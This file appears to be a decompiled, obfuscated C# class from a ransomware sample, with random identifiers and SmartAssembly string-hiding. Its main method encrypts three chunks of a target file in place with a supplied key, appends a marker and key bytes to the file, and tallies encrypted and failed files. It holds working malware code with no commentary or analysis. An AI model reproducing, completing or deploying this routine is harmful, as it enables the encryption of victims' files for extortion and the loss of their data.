using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using UHNiGjaKzZNxW;

namespace esImVhYKuzS;

internal sealed class PzYVJbOTPet
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int YyiYSsAQVREycE(long long_0)
	{
		return (int)long_0;
	}

	public static bool oJAyLxHDaqpVBf(string jimnwsVrAiGeEa, string DXfXePtkVUUs, string WHouWwGGbBNRBmYm, byte[] rNKEdXmRPYIKrR = null, byte[] vGWBrGCucbDPD = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(jimnwsVrAiGeEa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = YyiYSsAQVREycE(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(DXfXePtkVUUs) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(DXfXePtkVUUs) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(DXfXePtkVUUs) * 1024 * 1024) / 10;
				}
				int dCLcYqbkiNf = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = SbpBPbLErhIggp(jimnwsVrAiGeEa, fileStream, dCLcYqbkiNf, num * i);
					array = (jIDJtYejSBzFCRw.ZefUNZPKuQWv ? IkRHWwmJhhri.lrXUmqEbANrrJ(byte_, Convert.FromBase64String(WHouWwGGbBNRBmYm), vGWBrGCucbDPD) : nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(WHouWwGGbBNRBmYm), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					lYTWvJBStYha(jimnwsVrAiGeEa, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ ? Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107399850)) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400891)) + Convert.ToString(DXfXePtkVUUs) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400891))) : Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107399850)) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400900)) + Convert.ToString(DXfXePtkVUUs) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400900))));
			if (!jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ)
			{
				using FileStream fileStream2 = new FileStream(jimnwsVrAiGeEa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(jimnwsVrAiGeEa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(rNKEdXmRPYIKrR, 0, rNKEdXmRPYIKrR.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (jIDJtYejSBzFCRw.yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(jIDJtYejSBzFCRw.mldgFSRddxG, getString_0(107386335) + jimnwsVrAiGeEa + getString_0(107399869) + ex.Message + getString_0(107396802));
				}
				catch (Exception)
				{
				}
			}
			jIDJtYejSBzFCRw.IkmoiloXkEwN++;
			return false;
		}
		jIDJtYejSBzFCRw.JhEGykDTAlk++;
		return true;
	}

	public static byte[] SbpBPbLErhIggp(string vJinQBbYXghViWG, FileStream RnCvcdhBkqJVSm, int DCLcYqbkiNf, int GzPWowgWNaM = 0)
	{
		byte[] array = new byte[DCLcYqbkiNf];
		RnCvcdhBkqJVSm.Position = GzPWowgWNaM;
		RnCvcdhBkqJVSm.Read(array, 0, DCLcYqbkiNf);
		return array;
	}

	public static void lYTWvJBStYha(string YqrMiYxXyypB, FileStream yxILHMvyznIus, byte[] tWdKJYrENydIGi, int QByBBFcahly = 0)
	{
		yxILHMvyznIus.Position = QByBBFcahly;
		yxILHMvyznIus.Write(tWdKJYrENydIGi, 0, tWdKJYrENydIGi.Length);
	}

	static PzYVJbOTPet()
	{
		Strings.CreateGetStringDelegate(typeof(PzYVJbOTPet));
	}
}
